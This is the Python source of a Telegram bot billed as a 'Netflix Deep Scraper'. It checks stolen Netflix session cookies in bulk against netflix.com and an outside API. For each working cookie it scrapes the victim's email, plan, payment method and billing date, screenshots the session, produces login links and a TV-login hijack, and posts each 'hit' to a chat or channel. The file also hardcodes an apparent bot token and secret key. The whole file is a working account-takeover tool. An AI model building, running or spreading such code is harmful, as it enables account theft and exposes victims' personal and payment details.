import requests
import logging
import time
import urllib.parse
import io
import os
import sys
import re
import json
import threading
import telebot
import zipfile
import codecs
import concurrent.futures
from playwright.sync_api import sync_playwright
from telebot import types
from datetime import datetime, timedelta
import urllib3
from flask import Flask

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

user_modes = {}
BOT_TOKEN = "8477278414:AAHAxLMV9lgqvSCjnj_AIDnH6pxm82Q55So"
ADMIN_ID = 6176299339
CHANNELS = ["@F88UFNETFLIX", "@F88UF9844"]
API_BASE_URL = "http://nftgenapi.onrender.com/api"
SECRET_KEY = "KUROSAKI_YtkX2SnPDdtn0jU9fVyE0iSIGnjPaYIO"

# Prevent Memory Crash on Railway
SCREENSHOT_SEMAPHORE = threading.Semaphore(2)

app = Flask(__name__)

@app.route('/')
def home(): return "Deep Scraper Active & Stable!"

def keep_alive():
    t = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)), debug=False))
    t.daemon = True
    t.start()

HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

def get_flag(code):
    if not code or code == "Unknown": return "🌍"
    return "".join([chr(ord(c.upper()) + 127397) for c in code])

def extract_deep_details(html):
    d = {"plan": "Unknown", "email": "N/A", "country": "Unknown", "profiles": [], "status": "Dead", "quality": "Unknown", "member_since": "Unknown", "member_duration": "", "expiry": "N/A", "price": "Unknown", "payment": "Unknown", "phone": "N/A"}
    try:
        if '"membershipStatus":"CURRENT_MEMBER"' in html: d["status"] = "Active"
        # Deep Extraction for Email
        em = re.search(r'"email":"([^"]+)"', html)
        if em: d["email"] = em.group(1)
        # Quality & Resolution Logic
        pl = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if pl:
            d["plan"] = pl.group(1)
            p_low = d["plan"].lower()
            if "premium" in p_low: d["quality"] = "UHD 4K (3840x2160)"
            elif "standard" in p_low: d["quality"] = "HD 1080p (1920x1080)"
            else: d["quality"] = "HD 720p (1280x720)"
        # Billing & Region
        co = re.search(r'"currentCountry":"([^"]+)"', html)
        if co: d["country"] = co.group(1)
        ex = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if ex: d["expiry"] = ex.group(1)
        pr = re.search(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if pr: d["price"] = pr.group(1)
        pa = re.search(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if pa: d["payment"] = pa.group(1)
        # Profiles
        p_list = re.findall(r'"profileName":"([^"]+)"', html)
        d["profiles"] = list(set(p_list))
    except: pass
    return d

def call_api(endpoint, payload):
    try:
        payload["secret_key"] = SECRET_KEY
        return requests.post(f"{API_BASE_URL}/{endpoint}", json=payload, timeout=15).json()
    except: return None

def parse_cookie(c_in):
    c_in = c_in.strip()
    if c_in.startswith('['):
        try:
            for c in json.loads(c_in):
                if c.get('name') == 'NetflixId': return urllib.parse.unquote(c.get('value'))
        except: pass
    m = re.search(r"NetflixId=([^;]+)", c_in)
    return urllib.parse.unquote(m.group(1)) if m else c_in

def check_cookie(c_in):
    nid = parse_cookie(c_in)
    api = call_api("gen", {"netflix_id": nid})
    if not api or not api.get("success"): return {"valid": False}
    sess = requests.Session()
    sess.cookies.set("NetflixId", nid, domain=".netflix.com")
    try:
        acc = sess.get("https://www.netflix.com/YourAccount", headers=HEADERS, timeout=12).text
        data = extract_deep_details(acc)
        if data["email"] == "N/A": data["email"] = api.get("email", "N/A")
        shot = None
        if SCREENSHOT_SEMAPHORE.acquire(timeout=5):
            try:
                with sync_playwright() as p:
                    br = p.chromium.launch(headless=True)
                    ctx = br.new_context()
                    ctx.add_cookies([{'name': 'NetflixId', 'value': nid, 'domain': '.netflix.com', 'path': '/'}])
                    pg = ctx.new_page()
                    pg.goto("https://www.netflix.com/browse", timeout=20000, wait_until='load')
                    shot = pg.screenshot(type='jpeg', quality=40)
                    br.close()
            finally: SCREENSHOT_SEMAPHORE.release()
        return {"valid": True, "country": data["country"], "link": api.get("login_url"), "data": data, "shot": shot}
    except: return {"valid": True, "link": api.get("login_url"), "data": {"email": api.get("email", "N/A"), "status": "Active"}, "shot": None}

def main():
    keep_alive()
    bot = telebot.TeleBot(BOT_TOKEN)

    @bot.message_handler(commands=['start'])
    def welcome(m):
        kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
        kb.add("📩 Send Here (DM)", "📡 Send to Channel")
        kb.add("📺 TV Login", "🛑 Stop System")
        bot.send_message(m.chat.id, "🌟 **Netflix Deep Scraper Active**\nSelect Mode:", reply_markup=kb)

    @bot.message_handler(func=lambda m: m.text in ["📩 Send Here (DM)", "📡 Send to Channel", "🛑 Stop System"])
    def set_mode(m):
        uid = m.chat.id
        if m.text == "📩 Send Here (DM)":
            user_modes[uid] = {'target': uid, 'stop': False}
            bot.reply_to(m, "✅ **DM Mode Active.**")
        elif m.text == "📡 Send to Channel":
            msg = bot.reply_to(m, "📡 **Enter Channel ID:**")
            bot.register_next_step_handler(msg, ch_v)
        elif m.text == "🛑 Stop System":
            if uid in user_modes: user_modes[uid]['stop'] = True
            bot.reply_to(m, "🛑 **Stopped.**")

    def ch_v(m):
        try:
            cid = int(m.text.strip())
            chat = bot.get_chat(cid)
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton("✅ Confirm", callback_data=f"ok_{cid}"))
            bot.reply_to(m, f"📡 Channel: {chat.title}\nConfirm?", reply_markup=kb)
        except: bot.reply_to(m, "❌ Invalid ID.")

    @bot.callback_query_handler(func=lambda c: c.data.startswith("ok_"))
    def ch_ok(c):
        cid = int(c.data.split("_")[1])
        user_modes[c.message.chat.id] = {'target': cid, 'stop': False}
        bot.edit_message_text("✅ **Target Locked!**", c.message.chat.id, c.message.message_id)

    @bot.message_handler(func=lambda m: m.text == "📺 TV Login")
    def tv_s(m):
        msg = bot.reply_to(m, "📺 **Send Netflix Cookie.**")
        bot.register_next_step_handler(msg, tv_p)

    def tv_p(m):
        res = check_cookie(m.text)
        if not res.get("valid"): return bot.reply_to(m, "❌ Dead.")
        bot.reply_to(m, f"✅ Valid! Email: {res['data']['email']}\n8-Digit Code?")
        bot.register_next_step_handler(m, lambda ms: tv_f(ms, parse_cookie(m.text)))

    def tv_f(m, nid):
        api = call_api("tvlogin", {"netflix_id": nid, "tv_code": m.text.strip()})
        bot.reply_to(m, f"📺 Result: {api.get('message', 'Error')}")

    @bot.message_handler(content_types=['document', 'text'])
    def handle_io(m):
        uid = m.chat.id
        if m.text and (m.text.startswith("/") or m.text in ["📩 Send Here (DM)", "📡 Send to Channel", "📺 TV Login", "🛑 Stop System"]): return
        mode = user_modes.get(uid)
        if not mode: return bot.reply_to(m, "❌ Select Mode.")
        cookies = []
        if m.content_type == 'document':
            raw = bot.download_file(bot.get_file(m.document.file_id).file_path).decode('utf-8', errors='ignore')
            cookies = [l.strip() for l in raw.splitlines() if len(l.strip()) > 30]
        else: cookies = [l.strip() for l in m.text.splitlines() if len(l.strip()) > 30]
        stat = bot.reply_to(m, "⏳ **Checking...**")
        def work():
            total = len(cookies)
            hits = 0
            for i, c in enumerate(cookies, 1):
                if mode.get('stop'): break
                try: bot.edit_message_text(f"🚀 Checked: {i}/{total} | Hits: {hits}", uid, stat.message_id)
                except: pass
                res = check_cookie(c)
                if res.get("valid"):
                    hits += 1
                    send_hit(bot, mode['target'], res)
            bot.send_message(uid, f"✅ Done! Hits: {hits}")
        threading.Thread(target=work).start()

    def send_hit(bot_obj, target, res):
        d = res['data']
        def esc(t): return str(t).replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")
        msg = (f"🌟 **NETFLIX PREMIUM ULTRA HIT** 🌟\n\n"
               f"🟢 **STATUS:** Active ✅\n"
               f"🌍 **REGION:** {esc(res.get('country', 'Unknown'))} {get_flag(res.get('country'))}\n"
               f"👤 **OWNER:** {esc(d.get('name', 'Unknown'))}\n"
               f"👑 **PLAN:** {esc(d.get('plan', 'Premium'))}\n"
               f"📺 **QUALITY:** {esc(d.get('quality', '1080p'))}\n"
               f"💰 **PRICE:** {esc(d.get('price', 'Unknown'))}\n"
               f"💳 **PAYMENT:** {esc(d.get('payment', 'Unknown'))}\n"
               f"📅 **BILLING:** {esc(d.get('expiry', 'N/A'))}\n"
               f"🎭 **PROFILES:** {', '.join(d.get('profiles', []))}\n"
               f"📧 **EMAIL:** {esc(d.get('email', 'N/A'))}\n\n"
               f"💜 <b><a href='{res['link']}'>[CLICK HERE TO LOGIN]</a></b> 💜\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"👨‍💻 @F88UF | 📢 @F88UF9844")
        if res.get('shot'): bot_obj.send_photo(target, io.BytesIO(res['shot']), caption=msg, parse_mode='HTML')
        else: bot_obj.send_message(target, msg, parse_mode='HTML')

    bot.infinity_polling(skip_pending=True)

if __name__ == "__main__":
    main()
